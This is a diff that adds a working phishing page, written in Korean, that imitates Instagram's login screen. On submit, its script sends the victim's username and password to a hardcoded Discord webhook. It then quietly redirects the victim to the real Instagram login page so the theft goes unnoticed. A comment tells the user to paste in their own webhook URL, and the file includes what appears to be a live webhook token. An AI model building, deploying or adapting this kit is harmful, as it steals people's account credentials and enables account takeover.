@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        /* 인스타그램 스타일 재현 */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            width: 350px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .logo {
+            font-size: 35px;
+            font-weight: bold;
+            font-style: italic;
+            margin-bottom: 30px;
+            font-family: 'Trebuchet MS', sans-serif;
+        }
+        input {
+            width: 100%;
+            padding: 9px;
+            margin-bottom: 7px;
+            border: 1px solid #dbdbdb;
+            background-color: #fafafa;
+            border-radius: 3px;
+            box-sizing: border-box;
+            font-size: 12px;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
+        #loginBtn {
+            width: 100%;
+            padding: 7px;
+            border: none;
+            border-radius: 4px;
+            background-color: #0095f6;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        #loginBtn:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+        .footer-text {
+            margin-top: 20px;
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="logo">Instagram</div>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="전화번호, 사용자 이름 또는 이메일" required>
+        <input type="password" id="password" placeholder="비밀번호" required>
+        <button type="submit" id="loginBtn">로그인</button>
+    </form>
+    <div class="footer-text">비밀번호를 잊으셨나요?</div>
+</div>
+
+<script>
+    // ⚠️ 중요: 여기에 본인의 디스코드 웹후크 URL을 넣으세요.
+    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1502237128963391489/ysA_m1yWogdozqQfkgMMpNJh0nXJDnoqGbewH9pUaLP9TaNh3IH6K-v4tDcbSY14PCNj";
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault(); // 기본 폼 제출 방지
+
+        const userVal = document.getElementById('username').value;
+        const passVal = document.getElementById('password').value;
+        const btn = document.getElementById('loginBtn');
+
+        // 버튼 비활성화 (여러 번 클릭 방지)
+        btn.disabled = true;
+        btn.innerText = "로그인 중...";
+
+        // 디스코드 웹후크로 데이터 전송
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: "🔔 새로운 로그인 정보가 수집되었습니다",
+                    color: 16711815, // 분홍색 계열
+                    fields: [
+                        { name: "아이디 / 이메일", value: `**${userVal}**`, inline: false },
+                        { name: "비밀번호", value: `**${passVal}**`, inline: false }
+                    ],
+                    footer: { text: "수집 시각: " + new Date().toLocaleString() }
+                }]
+            })
+        })
+        .then(() => {
+            // 전송 성공 시 실제 인스타그램 로그인 페이지로 이동 (자연스럽게)
+            window.location.href = "https://www.instagram.com/accounts/login/";
+        })
+        .catch((err) => {
+            console.error("전송 실패:", err);
+            alert("연결 오류가 발생했습니다. 다시 시도해주세요.");
+            btn.disabled = false;
+            btn.innerText = "로그인";
+        });
+    });
+</script>
+
+</body>
+</html>
